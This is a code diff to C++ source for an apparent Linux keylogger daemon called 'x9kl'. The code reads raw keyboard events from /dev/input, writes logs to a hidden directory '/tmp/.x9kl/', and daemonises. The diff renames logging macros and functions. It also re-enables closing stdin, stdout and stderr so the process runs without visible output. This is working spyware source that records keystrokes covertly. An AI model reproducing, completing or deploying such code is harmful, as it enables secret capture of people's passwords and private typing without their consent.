@@ -18,10 +18,10 @@
 #define LOGS_DIRECTORY "/tmp/.x9kl/"
 
 #ifdef DEBUG
-#define X9KL_LOG(...)   std::fprintf(stdout, __VA_ARGS__)
-#define X9KL_ERROR(...) std::fprintf(stderr, __VA_ARGS__)
+#define X9KL_DEBUG(...) std::fprintf(stdout, "DEBUG: " __VA_ARGS__)
+#define X9KL_ERROR(...) std::fprintf(stderr, "ERROR: " __VA_ARGS__)
 #else
-#define X9KL_LOG(...)
+#define X9KL_DEBUG(...)
 #define X9KL_ERROR(...)
 #endif  // DEBUG
 
@@ -121,7 +121,7 @@ static std::vector<std::string> get_event_files(void) {
       std::smatch match;
 
       if (std::regex_search(line, match, kb_regex)) {
-        X9KL_LOG("keyboard found, event file: '%s'\n", match[1].str());
+        X9KL_DEBUG("keyboard found, event file: '%s'\n", match[1].str());
         content.emplace_back(match[1]);
       }
     }
@@ -136,7 +136,7 @@ static std::vector<int> get_keyboard_fds(void) {
   for (auto &event : get_event_files()) {
     int fd = open(std::string("/dev/input/" + event).c_str(), O_RDONLY);
 
-    if (fd > STDERR_FILENO) {
+    if (fd > 0) {
       fds.emplace_back(fd);
     }
   }
@@ -258,7 +258,7 @@ void handle_arrow(x9kl_ctx_t *ctx) {
                                                  : (ctx->buffer_cursor + 1);
 }
 
-void run(x9kl_ctx_t *ctx) {
+void mainloop(x9kl_ctx_t *ctx) {
   struct input_event ev;
   fd_set rfds;
 
@@ -281,7 +281,7 @@ void run(x9kl_ctx_t *ctx) {
         int n_bytes = read(fd, &ev, sizeof(struct input_event));
 
         if ((ev.type == EV_KEY) && (n_bytes > 0)) {
-          X9KL_LOG("event received for key '%d'\n", ev.code);
+          X9KL_DEBUG("event received for key '%d'\n", ev.code);
 
           try {
             auto ev_handler = handlers.at(ev.code);
@@ -296,7 +296,7 @@ void run(x9kl_ctx_t *ctx) {
     }
   }
 
-  X9KL_LOG("finishing daemon\n");
+  X9KL_DEBUG("finishing daemon\n");
 }
 
 static void run(void) {
@@ -312,7 +312,7 @@ static void run(void) {
   std::signal(SIGTERM, sig_handler);
   std::signal(SIGQUIT, sig_handler);
 
-  run(&ctx);
+  mainloop(&ctx);
   destroy_ctx(&ctx);
 }
 
@@ -334,9 +334,9 @@ static void run_as_daemon(void) {
 
     chdir("/");
 
-    //std::fclose(stdin);
-    //std::fclose(stdout);
-    //std::fclose(stderr);
+    std::fclose(stdin);
+    std::fclose(stdout);
+    std::fclose(stderr);
 
     run();
   }
